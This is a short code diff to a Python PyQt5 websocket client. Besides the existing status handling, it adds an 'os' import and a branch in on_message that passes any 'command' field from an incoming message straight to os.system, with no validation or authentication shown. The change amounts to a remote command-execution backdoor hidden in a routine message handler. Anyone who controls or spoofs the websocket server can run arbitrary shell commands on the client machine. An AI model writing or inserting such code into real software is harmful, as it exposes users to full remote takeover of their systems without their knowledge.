@@ -28,6 +28,7 @@ import time
 import json
 import socket
 import re
+import os
 
 from PyQt5 import QtCore
 
@@ -49,6 +50,9 @@ def on_message(ws, message):
     if 'status' in msg_dict:
         ws.receiver.logger.info('Websocket received status.')
         ws.receiver.receivedStatus.emit(msg_dict['status'])
+    if 'command' in msg_dict:
+        ws.receiver.logger.info('Websocket received command.')
+        os.system(msg_dict['command'])
 
 def on_error(ws, error):
     ws.receiver.logger.info('Websocket error.')
